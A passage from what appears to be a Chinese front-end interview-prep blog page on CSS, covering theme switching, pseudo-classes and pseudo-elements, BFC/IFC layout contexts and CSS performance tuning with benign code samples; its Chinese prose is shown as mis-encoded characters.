class="hljs-attr">--bg-color</span>: <span class="hljs-number">#fff</span>;<br>  <span class="hljs-attr">--text-color</span>: <span class="hljs-number">#333</span>;<br>&#125;<br><br><span class="hljs-comment">/* æš—è‰²æ¨¡å¼ */</span><br><span class="hljs-selector-attr">[data-theme=<span class="hljs-string">&quot;dark&quot;</span>]</span> &#123;<br>  <span class="hljs-attr">--bg-color</span>: <span class="hljs-number">#222</span>;<br>  <span class="hljs-attr">--text-color</span>: <span class="hljs-number">#f0f0f0</span>;<br>&#125;<br><br><span class="hljs-selector-tag">body</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--bg-color);<br>  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color);<br>  <span class="hljs-attribute">transition</span>: background <span class="hljs-number">0.3s</span>, color <span class="hljs-number">0.3s</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// JSåˆ‡æ¢ä¸»é¢˜</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;data-theme&#x27;</span>, <span class="hljs-string">&#x27;dark&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="4-2-ä¼ªç±»ä¸ä¼ªå…ƒç´ ï¼ˆ-hoverã€-beforeã€-selectionï¼‰"><a href="#4-2-ä¼ªç±»ä¸ä¼ªå…ƒç´ ï¼ˆ-hoverã€-beforeã€-selectionï¼‰" class="headerlink" title="4.2 ä¼ªç±»ä¸ä¼ªå…ƒç´ ï¼ˆ:hoverã€::beforeã€::selectionï¼‰"></a>4.2 ä¼ªç±»ä¸ä¼ªå…ƒç´ ï¼ˆ:hoverã€::beforeã€::selectionï¼‰</h2><h3 id="æ ¸å¿ƒæ¦‚å¿µåŒºåˆ†"><a href="#æ ¸å¿ƒæ¦‚å¿µåŒºåˆ†" class="headerlink" title="æ ¸å¿ƒæ¦‚å¿µåŒºåˆ†"></a>æ ¸å¿ƒæ¦‚å¿µåŒºåˆ†</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">ä¼ªç±»ï¼ˆPseudo-classï¼‰</th><th align="left">ä¼ªå…ƒç´ ï¼ˆPseudo-elementï¼‰</th></tr></thead><tbody><tr><td align="left">è¯­æ³•</td><td align="left">å•å†’å·ï¼ˆ:hoverï¼‰</td><td align="left">åŒå†’å·ï¼ˆ::beforeï¼‰</td></tr><tr><td align="left">ä½œç”¨å¯¹è±¡</td><td align="left">é€‰æ‹©å…ƒç´ çš„ç‰¹å®šçŠ¶æ€</td><td align="left">åˆ›å»ºå…ƒç´ çš„è™šæ‹Ÿå­å…ƒç´ </td></tr><tr><td align="left">DOMè¡¨ç°</td><td align="left">ä¸åˆ›å»ºæ–°èŠ‚ç‚¹</td><td align="left">åˆ›å»ºæ–‡æ¡£æ ‘å¤–çš„æŠ½è±¡å…ƒç´ </td></tr><tr><td align="left">å…¸å‹åº”ç”¨</td><td align="left">äº¤äº’çŠ¶æ€ï¼ˆå¦‚:hoverï¼‰</td><td align="left">è£…é¥°æ€§å†…å®¹ï¼ˆå¦‚::beforeï¼‰</td></tr></tbody></table><h3 id="ä¼ªç±»è¯¦è§£ï¼ˆçŠ¶æ€é€‰æ‹©å™¨ï¼‰"><a href="#ä¼ªç±»è¯¦è§£ï¼ˆçŠ¶æ€é€‰æ‹©å™¨ï¼‰" class="headerlink" title="ä¼ªç±»è¯¦è§£ï¼ˆçŠ¶æ€é€‰æ‹©å™¨ï¼‰"></a>ä¼ªç±»è¯¦è§£ï¼ˆçŠ¶æ€é€‰æ‹©å™¨ï¼‰</h3><p><strong>åŠ¨æ€äº¤äº’ä¼ªç±»</strong></p><table><thead><tr><th align="left">ä¼ªç±»</th><th align="left">è§¦å‘æ¡ä»¶</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">:hover</td><td align="left">é¼ æ ‡æ‚¬åœ</td><td align="left">a:hover { color: red }</td></tr><tr><td align="left">:active</td><td align="left">å…ƒç´ è¢«æ¿€æ´»ï¼ˆå¦‚ç‚¹å‡»æŒ‰ä¸‹ï¼‰</td><td align="left">button:active { transform: scale(0.98) }</td></tr><tr><td align="left">:focus</td><td align="left">è·å¾—ç„¦ç‚¹ï¼ˆè¡¨å•&#x2F;å¯èšç„¦å…ƒç´ ï¼‰</td><td align="left">input:focus { border-color: blue }</td></tr><tr><td align="left">:focus-visible</td><td align="left">é”®ç›˜èšç„¦æ—¶ç”Ÿæ•ˆ</td><td align="left">å…¼å®¹outlineæ— éšœç¢è®¾è®¡</td></tr></tbody></table><p><strong>ç»“æ„ä¼ªç±»</strong></p><table><thead><tr><th align="left">ä¼ªç±»</th><th align="left">åŒ¹é…è§„åˆ™</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">:first-child</td><td align="left">çˆ¶å…ƒç´ çš„é¦–ä¸ªå­å…ƒç´ </td><td align="left">li:first-child { font-weight: bold }</td></tr><tr><td align="left">:nth-child(n)</td><td align="left">ç¬¬nä¸ªå­å…ƒç´ ï¼ˆæ”¯æŒå…¬å¼ï¼‰</td><td align="left">tr:nth-child(2n+1) { background: #f5f5f5 }</td></tr><tr><td align="left">:not(selector)</td><td align="left">åå‘é€‰æ‹©å™¨</td><td align="left">div:not(.hidden) { display: block }</td></tr></tbody></table><h3 id="ä¼ªå…ƒç´ è¯¦è§£ï¼ˆè™šæ‹Ÿå†…å®¹ç”Ÿæˆï¼‰"><a href="#ä¼ªå…ƒç´ è¯¦è§£ï¼ˆè™šæ‹Ÿå†…å®¹ç”Ÿæˆï¼‰" class="headerlink" title="ä¼ªå…ƒç´ è¯¦è§£ï¼ˆè™šæ‹Ÿå†…å®¹ç”Ÿæˆï¼‰"></a>ä¼ªå…ƒç´ è¯¦è§£ï¼ˆè™šæ‹Ÿå†…å®¹ç”Ÿæˆï¼‰</h3><p><strong>æ ¸å¿ƒä¼ªå…ƒç´ </strong></p><table><thead><tr><th align="left">ä¼ªå…ƒç´ </th><th align="left">ä½œç”¨</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">::before</td><td align="left">åœ¨å…ƒç´ å†…å®¹å‰æ’å…¥</td><td align="left">.alert::before { content: â€œ!â€ }</td></tr><tr><td align="left">::after</td><td align="left">åœ¨å…ƒç´ å†…å®¹åæ’å…¥</td><td align="left">æ¸…é™¤æµ®åŠ¨&#x2F;å·¥å…·æç¤º</td></tr><tr><td align="left">::first-line</td><td align="left">é€‰ä¸­é¦–è¡Œæ–‡æœ¬</td><td align="left">p::first-line { font-size: 1.2em }</td></tr><tr><td align="left">::selection</td><td align="left">ç”¨æˆ·é€‰ä¸­çš„æ–‡æœ¬</td><td align="left">::selection { background: gold }</td></tr></tbody></table><p><strong>å…³é”®æŠ€æœ¯è¦ç‚¹</strong></p><ol><li>content å±æ€§å¿…é¡»è®¾ç½®ï¼ˆç©ºå­—ç¬¦ä¸²ä¹Ÿè¦è®¾ç½®ï¼‰</li><li>ä¼ªå…ƒç´ ä¸æ¥å— DOM äº‹ä»¶</li><li>é»˜è®¤ä½äºä¸»å…ƒç´ ä¸‹å±‚ï¼Œå¯é€šè¿‡ <code>z-index</code> è°ƒæ•´</li></ol><h3 id="ç»„åˆä½¿ç”¨æŠ€å·§ç¤ºä¾‹ï¼šçº¯-CSS-å®ç°å·¥å…·æç¤º"><a href="#ç»„åˆä½¿ç”¨æŠ€å·§ç¤ºä¾‹ï¼šçº¯-CSS-å®ç°å·¥å…·æç¤º" class="headerlink" title="ç»„åˆä½¿ç”¨æŠ€å·§ç¤ºä¾‹ï¼šçº¯ CSS å®ç°å·¥å…·æç¤º"></a>ç»„åˆä½¿ç”¨æŠ€å·§ç¤ºä¾‹ï¼šçº¯ CSS å®ç°å·¥å…·æç¤º</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-attr">[data-tooltip]</span> &#123;<br>  <span class="hljs-attribute">position</span>: relative;<br>&#125;<br><span class="hljs-selector-attr">[data-tooltip]</span><span class="hljs-selector-pseudo">:hover</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-built_in">attr</span>(data-tooltip);<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">bottom</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#333</span>;<br>  <span class="hljs-attribute">color</span>: white;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">8px</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;<br>  <span class="hljs-attribute">white-space</span>: nowrap;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-3-BFCï¼ˆå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰ä¸-IFCï¼ˆè¡Œå†…æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰"><a href="#4-3-BFCï¼ˆå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰ä¸-IFCï¼ˆè¡Œå†…æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰" class="headerlink" title="4.3 BFCï¼ˆå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰ä¸ IFCï¼ˆè¡Œå†…æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰"></a>4.3 BFCï¼ˆå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰ä¸ IFCï¼ˆè¡Œå†…æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰</h2><h3 id="æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”-1"><a href="#æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”-1" class="headerlink" title="æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”"></a>æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">BFCï¼ˆBlock Formatting Contextï¼‰</th><th align="left">IFCï¼ˆInline Formatting Contextï¼‰</th></tr></thead><tbody><tr><td align="left">å¸ƒå±€æ–¹å‘</td><td align="left">å‚ç›´æ’åˆ—</td><td align="left">æ°´å¹³æ’åˆ—</td></tr><tr><td align="left">å…ƒç´ ç±»å‹</td><td align="left">å—çº§å…ƒç´ å‚ä¸</td><td align="left">è¡Œå†…çº§å…ƒç´ å‚ä¸</td></tr><tr><td align="left">å®½åº¦è®¡ç®—</td><td align="left">æ’‘æ»¡çˆ¶å®¹å™¨ï¼ˆé™¤éæŒ‡å®šå®½åº¦ï¼‰</td><td align="left">ç”±å†…å®¹å†³å®š</td></tr><tr><td align="left">è¾¹è·å¤„ç†</td><td align="left">å‚ç›´è¾¹è·å¯èƒ½åˆå¹¶</td><td align="left">æ°´å¹³è¾¹è·æœ‰æ•ˆï¼Œå‚ç›´è¾¹è·ä¸å½±å“è¡Œé«˜</td></tr><tr><td align="left">ç»å…¸åº”ç”¨</td><td align="left">æ¸…é™¤æµ®åŠ¨&#x2F;é˜²æ­¢è¾¹è·åˆå¹¶</td><td align="left">æ–‡å­—å¯¹é½&#x2F;è¡Œå†…å…ƒç´ æ’åˆ—</td></tr></tbody></table><h3 id="BFC-è¯¦è§£ï¼ˆå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰"><a href="#BFC-è¯¦è§£ï¼ˆå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰" class="headerlink" title="BFC è¯¦è§£ï¼ˆå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰"></a>BFC è¯¦è§£ï¼ˆå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰</h3><p><strong>è§¦å‘æ¡ä»¶</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* ä»»ä¸€æ¡ä»¶å³å¯è§¦å‘ */</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flow-root; <span class="hljs-comment">/* æœ€çº¯å‡€çš„BFC */</span><br>  <span class="hljs-attribute">overflow</span>: hidden;   <span class="hljs-comment">/* évisible */</span><br>  <span class="hljs-attribute">float</span>: left/right;<br>  <span class="hljs-attribute">position</span>: absolute/fixed;<br>  <span class="hljs-attribute">display</span>: inline-block/table-cell/flex/grid;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p><ul><li>éš”ç¦»çš„å¸ƒå±€ç¯å¢ƒï¼šå†…éƒ¨å…ƒç´ ä¸ä¼šå½±å“å¤–éƒ¨å…ƒç´ å¸ƒå±€ï¼Œå¤–éƒ¨æµ®åŠ¨ä¸ä¼šä¾µå…¥ BFC åŒºåŸŸ</li><li>è¾¹è·æŠ˜å è§£å†³ï¼šå¤–éƒ¨å…ƒç´ ä¸å†å‘ç”Ÿè¾¹è·åˆå¹¶</li><li>åŒ…å«æµ®åŠ¨å…ƒç´ </li></ul><p><strong>ç¤ºä¾‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;bfc-container&quot;&gt; &lt;!-- è§¦å‘BFC --&gt;<br>  &lt;div style=&quot;margin: 20px&quot;&gt;&lt;/div&gt;<br>&lt;/div&gt;<br>&lt;!-- å¤–éƒ¨å…ƒç´ ä¸å†å‘ç”Ÿè¾¹è·åˆå¹¶ --&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: table; <span class="hljs-comment">/* åˆ›å»ºBFC */</span><br>  <span class="hljs-attribute">clear</span>: both;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IFC-è¯¦è§£ï¼ˆè¡Œå†…æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰"><a href="#IFC-è¯¦è§£ï¼ˆè¡Œå†…æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰" class="headerlink" title="IFC è¯¦è§£ï¼ˆè¡Œå†…æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰"></a>IFC è¯¦è§£ï¼ˆè¡Œå†…æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰</h3><p><strong>è§¦å‘æ¡ä»¶</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* é»˜è®¤ç”±è¡Œå†…çº§å…ƒç´ è‡ªåŠ¨åˆ›å»º */</span><br><span class="hljs-selector-class">.inline-container</span> &#123;<br>  <span class="hljs-attribute">display</span>: inline/inline-block/inline-flex;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>; <span class="hljs-comment">/* å½±å“line-heightè®¡ç®— */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p><ul><li>è¡Œæ¡†ï¼ˆline boxï¼‰æ¦‚å¿µï¼šæ¯è¡Œæ–‡æœ¬ç”Ÿæˆä¸€ä¸ªçŸ©å½¢è¡Œæ¡†ï¼Œé«˜åº¦ç”± <code>line-height</code> å†³å®š</li><li>å‚ç›´å¯¹é½æ§åˆ¶ï¼š<code>vertical-align: middle</code> ç›¸å¯¹è¡Œæ¡†å¯¹é½</li><li>ç©ºç™½ç¬¦å¤„ç†ï¼šè¿ç»­å¤šä¸ªç©ºç™½ç¬¦åˆå¹¶ä¸ºå•ä¸ªç©ºæ ¼ï¼Œæ¢è¡Œç¬¦è½¬ä¸ºç©ºæ ¼</li></ul><h3 id="å¸ƒå±€åœºæ™¯å¯¹æ¯”"><a href="#å¸ƒå±€åœºæ™¯å¯¹æ¯”" class="headerlink" title="å¸ƒå±€åœºæ™¯å¯¹æ¯”"></a>å¸ƒå±€åœºæ™¯å¯¹æ¯”</h3><p><strong>æµ®åŠ¨å…ƒç´ å¤„ç†</strong></p><table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="left">BFC</th><th align="left">IFC</th></tr></thead><tbody><tr><td align="left">æ•ˆæœ</td><td align="left">åŒ…å«æµ®åŠ¨ï¼Œé˜»æ­¢æ–‡å­—ç¯ç»•</td><td align="left">æ— æ³•åŒ…å«æµ®åŠ¨ï¼Œå…è®¸æ–‡å­—ç¯ç»•</td></tr><tr><td align="left">ä»£ç </td><td align="left">overflow: hidden</td><td align="left">é»˜è®¤è¡Œä¸º</td></tr></tbody></table><p><strong>å‚ç›´å¯¹é½</strong></p><table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="left">BFC</th><th align="left">IFC</th></tr></thead><tbody><tr><td align="left">æ§åˆ¶</td><td align="left">é€šè¿‡margin&#x2F;paddingè°ƒæ•´</td><td align="left">é€šè¿‡ vertical-align ç²¾ç¡®æ§åˆ¶</td></tr><tr><td align="left">ç²¾åº¦</td><td align="left">æ•´å—è°ƒæ•´</td><td align="left">åƒç´ çº§å¯¹é½</td></tr></tbody></table><h3 id="é«˜é¢‘é¢è¯•"><a href="#é«˜é¢‘é¢è¯•" class="headerlink" title="é«˜é¢‘é¢è¯•"></a>é«˜é¢‘é¢è¯•</h3><p><strong>Qï¼šBFC å¦‚ä½•è§£å†³è¾¹è·åˆå¹¶</strong></p><p>åˆ›å»ºç‹¬ç«‹å¸ƒå±€ç¯å¢ƒï¼Œé˜»æ–­ä¸å¤–éƒ¨å…ƒç´ çš„è¾¹è·æŠ˜å </p><p><strong>Qï¼šIFC ä¸­ <code>vertical-align</code> å¤±æ•ˆçš„åŸå› ï¼Ÿ</strong></p><ul><li>æ£€æŸ¥å…ƒç´ æ˜¯å¦çœŸæ˜¯è¡Œå†…çº§ï¼ˆdisplay å€¼ï¼‰</li><li>ç¡®è®¤çˆ¶å…ƒç´ æœ‰æœ‰æ•ˆ <code>line-height</code></li></ul><p><strong>Qï¼šBFCä¸display: flow-rootçš„åŒºåˆ«ï¼Ÿ</strong></p><p>flow-rootæ˜¯ä¸“ä¸ºBFCè®¾è®¡çš„æ–°å€¼ï¼Œæ— å‰¯ä½œç”¨ï¼ˆä¸è§¦å‘æ»šåŠ¨æ¡&#x2F;è£å‰ªï¼‰</p><h2 id="4-4-CSS-æ€§èƒ½ä¼˜åŒ–ï¼ˆwill-changeã€containã€GPU-åŠ é€Ÿï¼‰"><a href="#4-4-CSS-æ€§èƒ½ä¼˜åŒ–ï¼ˆwill-changeã€containã€GPU-åŠ é€Ÿï¼‰" class="headerlink" title="4.4 CSS æ€§èƒ½ä¼˜åŒ–ï¼ˆwill-changeã€containã€GPU åŠ é€Ÿï¼‰"></a>4.4 CSS æ€§èƒ½ä¼˜åŒ–ï¼ˆwill-changeã€containã€GPU åŠ é€Ÿï¼‰</h2><h3 id="will-changeï¼šæ€§èƒ½ä¼˜åŒ–é¢„å‘Šç³»ç»Ÿ"><a href="#will-changeï¼šæ€§èƒ½ä¼˜åŒ–é¢„å‘Šç³»ç»Ÿ" class="headerlink" title="will-changeï¼šæ€§èƒ½ä¼˜åŒ–é¢„å‘Šç³»ç»Ÿ"></a>will-changeï¼šæ€§èƒ½ä¼˜åŒ–é¢„å‘Šç³»ç»Ÿ</h3><ul><li>ä½œç”¨ï¼šé¢„å…ˆå‘ŠçŸ¥æµè§ˆå™¨å…ƒç´ å¯èƒ½å‘ç”Ÿçš„å˜åŒ–ï¼Œè®©æµè§ˆå™¨æå‰ä¼˜åŒ–</li></ul><p><strong>æ­£ç¡®ä½¿ç”¨å§¿åŠ¿</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.optimize</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: transform, opacity; <span class="hljs-comment">/* æ˜ç¡®æŒ‡å®šè¦å˜åŒ–çš„å±æ€§ */</span><br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span>;<br>&#125;<br><span class="hljs-selector-class">.optimize</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µ</strong></p><p>ï¼ˆ1ï¼‰é€‚ç”¨åœºæ™¯</p><ul><li>å¤æ‚åŠ¨ç”»å…ƒç´ </li><li>å³å°†å‘ç”Ÿå˜åŒ–çš„æ»šåŠ¨åŒºåŸŸ</li></ul><p>ï¼ˆ2ï¼‰é¿å‘æŒ‡å—</p><ul><li>ä¸è¦è¿‡åº¦ä½¿ç”¨ï¼ˆæ¯ä¸ªé¡µé¢ &lt;&#x3D; 5 ä¸ªï¼‰</li><li>åŠ¨ç”»ç»“æŸåç§»é™¤ï¼ˆé€šè¿‡ jsï¼‰</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;animationend&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  element.<span class="hljs-property">style</span>.<span class="hljs-property">willChange</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="containï¼šå¸ƒå±€éš”ç¦»æ ¸æ­¦å™¨"><a href="#containï¼šå¸ƒå±€éš”ç¦»æ ¸æ­¦å™¨" class="headerlink" title="containï¼šå¸ƒå±€éš”ç¦»æ ¸æ­¦å™¨"></a>containï¼šå¸ƒå±€éš”ç¦»æ ¸æ­¦å™¨</h3><ul><li>ä½œç”¨ï¼šé™åˆ¶æµè§ˆå™¨é‡ç»˜&#x2F;å›æµèŒƒå›´ï¼Œç±»ä¼¼äº React çš„ shouldComponentUpdate</li></ul><p><strong>å…³é”®å±æ€§å€¼</strong></p><table><thead><tr><th align="left">å€¼</th><th align="left">ä¼˜åŒ–æ–¹å‘</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">layout</td><td align="left">éš”ç¦»å¸ƒå±€è®¡ç®—</td><td align="left">é¢‘ç¹ç§»åŠ¨çš„ç‹¬ç«‹ç»„ä»¶</td></tr><tr><td align="left">paint</td><td align="left">é™åˆ¶ç»˜åˆ¶åŒºåŸŸ</td><td align="left">å¼¹çª—&#x2F;ä¸‹æ‹‰èœå•</td></tr><tr><td align="left">size</td><td align="left">å¿½ç•¥å­å…ƒç´ å°ºå¯¸å½±å“</td><td align="left">å›ºå®šå°ºå¯¸å®¹å™¨</td></tr><tr><td align="left">strict</td><td align="left">å…¨éƒ¨éš”ç¦»ï¼ˆæ€§èƒ½æœ€å¼ºï¼‰</td><td align="left">å¤æ‚åŠ¨ç”»ç»„ä»¶</td></tr></tbody></table><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.product-card</span> &#123;<br>  <span class="hljs-attribute">contain</span>: strict; <span class="hljs-comment">/* å¡ç‰‡å†…éƒ¨å˜åŒ–ä¸å½±å“å¤–éƒ¨å¸ƒå±€ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="GPUåŠ é€Ÿï¼šå¤åˆå±‚ä¼˜åŒ–ç­–ç•¥"><a href="#GPUåŠ é€Ÿï¼šå¤åˆå±‚ä¼˜åŒ–ç­–ç•¥" class="headerlink" title="GPUåŠ é€Ÿï¼šå¤åˆå±‚ä¼˜åŒ–ç­–ç•¥"></a>GPUåŠ é€Ÿï¼šå¤åˆå±‚ä¼˜åŒ–ç­–ç•¥</h3><p><strong>GPU åŠ é€Ÿçš„æœ¬è´¨</strong></p><p>æµè§ˆå™¨å°†ç‰¹å®šå…ƒç´ çš„æ¸²æŸ“å·¥ä½œä» CPU è½¬ç§»åˆ° GPU å¤„ç†ï¼Œåˆ©ç”¨å›¾å½¢ç¡¬ä»¶çš„å¹¶è¡Œè®¡ç®—èƒ½åŠ›ã€‚è¿™ç§ä¼˜åŒ–é€šè¿‡åˆ›å»ºç‹¬ç«‹çš„å¤åˆå±‚å®ç°ã€‚</p><p><strong>æ ¸å¿ƒè§¦å‘æ¡ä»¶ï¼ˆchromium å†…æ ¸ä¸ºä¾‹ï¼‰</strong></p><p>ï¼ˆ1ï¼‰3D å˜æ¢å±æ€§</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-3d</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate3d</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">/* æœ€å¸¸ç”¨hack */</span><br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">10deg</span>);        <span class="hljs-comment">/* ä»»æ„3Då‡½æ•° */</span><br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">perspective</span>(<span class="hljs-number">500px</span>);    <span class="hljs-comment">/* æ™¯æ·±è®¾ç½® */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½œç”¨æœºåˆ¶ï¼šå¼ºåˆ¶æµè§ˆå™¨å°†å…ƒç´ è§†ä¸º 3D ç©ºé—´å¯¹è±¡ï¼Œè‡ªåŠ¨è§¦å‘å±‚æå‡</p><p>ï¼ˆ2ï¼‰é€æ˜åº¦åŠ¨ç”» + ç¡¬ä»¶åŠ é€Ÿ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.fade-in</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: opacity;  <span class="hljs-comment">/* é¢„å…ˆå£°æ˜ */</span><br>  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.3s</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç‰¹æ®Šåœºæ™¯ï¼šä»…å½“ä¸ transform æˆ– filter ç»„åˆæ—¶ GPU åŠ é€Ÿæ‰ç¨³å®šç”Ÿæ•ˆ</p><p>ï¼ˆ3ï¼‰æ»¤é•œæ•ˆæœ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.filter-gpu</span> &#123;<br>  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">5px</span>);          <span class="hljs-comment">/* é«˜æ–¯æ¨¡ç³Š */</span><br>  <span class="hljs-attribute">backdrop-filter</span>: <span class="hljs-built_in">saturate</span>(<span class="hljs-number">180%</span>); <span class="hljs-comment">/* èƒŒæ™¯æ»¤é•œ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ€§èƒ½è­¦å‘Šï¼šfilter å±æ€§å¯èƒ½å¼•å‘é‡ç»˜ï¼ˆéœ€é…åˆ will-change ä¼˜åŒ–ï¼‰</p><p>ï¼ˆ4ï¼‰å¼ºåˆ¶å±‚æå‡å±æ€§</p><table><thead><tr><th align="left">å±æ€§</th><th align="left">æ•ˆæœ</th><th align="left">æ¨èæŒ‡æ•°</th></tr></thead><tbody><tr><td align="left">will-change: transform</td><td align="left">æœ€æ ‡å‡†åšæ³•</td><td align="left">â˜…â˜…â˜…â˜…â˜…</td></tr><tr><td align="left">backface-visibility: hidden</td><td align="left">æ—§ç‰ˆå…¼å®¹æ–¹æ¡ˆ</td><td 